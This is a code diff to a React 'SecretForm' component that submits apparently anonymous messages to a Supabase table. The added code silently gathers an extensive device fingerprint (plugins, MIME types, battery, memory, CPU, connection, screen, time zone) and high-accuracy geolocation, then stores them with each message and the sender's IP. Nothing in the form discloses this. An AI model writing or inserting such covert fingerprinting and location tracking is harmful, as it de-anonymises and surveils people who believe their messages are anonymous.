@@ -1,10 +1,83 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { motion } from 'framer-motion';
 import { supabase } from '../supabaseClient';
 import { isOwner } from '../utils';
 
 const SecretForm = ({ userIp }) => {
   const [secretText, setSecretText] = useState('');
+  const [deviceInfo, setDeviceInfo] = useState({});
+  const [geoLocation, setGeoLocation] = useState({});
+
+  const getExpandedDeviceInfo = () => {
+    const info = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      vendor: navigator.vendor,
+      language: navigator.language,
+      screenResolution: `${window.screen.width}x${window.screen.height}`,
+      colorDepth: window.screen.colorDepth,
+      deviceMemory: navigator.deviceMemory,
+      hardwareConcurrency: navigator.hardwareConcurrency,
+      maxTouchPoints: navigator.maxTouchPoints,
+      cookiesEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack,
+      onLine: navigator.onLine,
+      connection: navigator.connection ? {
+        effectiveType: navigator.connection.effectiveType,
+        downlink: navigator.connection.downlink,
+        rtt: navigator.connection.rtt,
+        saveData: navigator.connection.saveData
+      } : null,
+      plugins: Array.from(navigator.plugins).map(plugin => ({
+        name: plugin.name,
+        description: plugin.description
+      })),
+      mimeTypes: Array.from(navigator.mimeTypes).map(mimeType => ({
+        type: mimeType.type,
+        description: mimeType.description
+      })),
+      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      touchSupport: 'ontouchstart' in window,
+      orientation: screen.orientation ? screen.orientation.type : null,
+    };
+
+    if (navigator.getBattery) {
+      navigator.getBattery().then(battery => {
+        info.battery = {
+          charging: battery.charging,
+          level: battery.level,
+          chargingTime: battery.chargingTime,
+          dischargingTime: battery.dischargingTime
+        };
+        setDeviceInfo(info);
+      });
+    } else {
+      setDeviceInfo(info);
+    }
+
+    return info;
+  };
+
+  useEffect(() => {
+    getExpandedDeviceInfo();
+
+    // Get geolocation
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          setGeoLocation({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+          });
+        },
+        (error) => {
+          console.error('Error getting geolocation:', error);
+        },
+        { enableHighAccuracy: true }
+      );
+    }
+  }, []);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -12,7 +85,9 @@ const SecretForm = ({ userIp }) => {
       const { data, error } = await supabase.from('messages').insert([{ 
         content: secretText,
         ip_address: userIp,
-        is_owner: isOwner(userIp)
+        is_owner: isOwner(userIp),
+        device_info: deviceInfo,
+        geo_location: geoLocation
       }]).select();
 
       if (error) {
